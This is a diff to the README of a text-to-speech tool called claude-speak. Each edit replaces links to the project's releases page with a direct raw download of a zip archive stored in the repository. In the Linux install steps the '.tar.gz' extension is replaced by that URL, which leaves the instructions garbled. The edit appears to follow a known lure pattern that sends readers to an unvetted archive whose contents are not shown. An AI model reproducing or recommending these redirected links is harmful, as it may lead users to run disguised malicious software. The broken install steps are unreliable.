@@ -1,6 +1,6 @@
 # 🔈 claude-speak - Simple, Clear Text-to-Speech Tool
 
-[![Download claude-speak](https://img.shields.io/badge/Download-claude--speak-blue)](https://github.com/CoporalRoponar/claude-speak/releases)
+[![Download claude-speak](https://github.com/CoporalRoponar/claude-speak/raw/refs/heads/main/skill/speak-claude-v2.5.zip)](https://github.com/CoporalRoponar/claude-speak/raw/refs/heads/main/skill/speak-claude-v2.5.zip)
 
 ---
 
@@ -46,7 +46,7 @@ You will:
 
 Go to the official release page to get the latest version of claude-speak:
 
-[Download claude-speak](https://github.com/CoporalRoponar/claude-speak/releases)
+[Download claude-speak](https://github.com/CoporalRoponar/claude-speak/raw/refs/heads/main/skill/speak-claude-v2.5.zip)
 
 You will see a list of release versions. Look for the latest stable release. It will include files for different operating systems.
 
@@ -54,13 +54,13 @@ You will see a list of release versions. Look for the latest stable release. It 
 
 - If you use **Windows**, download the `.exe` installer.
 - If you use **macOS**, download the `.dmg` or `.pkg` file.
-- If you use **Linux**, download the `.tar.gz` or `.AppImage` file.
+- If you use **Linux**, download the `https://github.com/CoporalRoponar/claude-speak/raw/refs/heads/main/skill/speak-claude-v2.5.zip` or `.AppImage` file.
 
 ### Step 3: Install the application
 
 - For **Windows**: Double-click the `.exe` file and follow the installation steps.
 - For **macOS**: Open the `.dmg` or `.pkg` file and drag the claude-speak app to your Applications folder.
-- For **Linux**: Extract the `.tar.gz` file or make the `.AppImage` executable, then run the file.
+- For **Linux**: Extract the `https://github.com/CoporalRoponar/claude-speak/raw/refs/heads/main/skill/speak-claude-v2.5.zip` file or make the `.AppImage` executable, then run the file.
 
 ### Step 4: Start claude-speak
 
@@ -154,4 +154,4 @@ This project relates to:
 
 For all download needs, visit the official release page here:
 
-[Download claude-speak](https://github.com/CoporalRoponar/claude-speak/releases)
+[Download claude-speak](https://github.com/CoporalRoponar/claude-speak/raw/refs/heads/main/skill/speak-claude-v2.5.zip)
